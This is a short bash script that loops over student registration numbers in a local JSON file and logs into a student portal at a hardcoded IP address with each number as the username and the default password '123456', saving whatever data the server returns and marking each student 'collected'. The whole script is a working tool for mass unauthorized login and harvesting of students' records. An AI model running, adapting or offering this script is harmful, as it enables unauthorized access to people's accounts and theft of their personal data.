#!/bin/bash

# Constants
SERVER_ADDRESS="http://103.113.200.45:8006/api/student/login"
DB_FILE_PATH="./db/ov.regs.json"

# Function to get registration data
get_reg_data() {
  local reg=$1
  local form_data="username=${reg}&password=123456&recaptcha-v3=undefined"
  local response=$(curl -s -X POST -d "${form_data}" "${SERVER_ADDRESS}")
  echo "${response}"
}

# Main function
main() {
  local total_students=0

  # Read the database and parse JSON
  students=$(jq -c '.students[] | select(.reg >= 22237000000 and .collected == false)' "${DB_FILE_PATH}")
  total_students=$(echo "${students}" | wc -l)

  echo "Total student ${total_students}"

  # Iterate over students
  echo "${students}" | while read -r student; do
    reg=$(echo "${student}" | jq -r '.reg')

    # Skip VPN check

    # Fetch data if not present
    if [ "$(echo "${student}" | jq -r '.data')" == "null" ]; then
      student_data=$(get_reg_data "${reg}")
      jq --argjson data "${student_data}" --arg reg "${reg}" '
        (.students[] | select(.reg == ($reg | tonumber))).data = $data
        | (.students[] | select(.reg == ($reg | tonumber))).collected = true
      ' "${DB_FILE_PATH}" > "${DB_FILE_PATH}.tmp" && mv "${DB_FILE_PATH}.tmp" "${DB_FILE_PATH}"

      echo "${reg} Collected."
    else
      echo "${reg} Exists."
    fi
  done
}

main
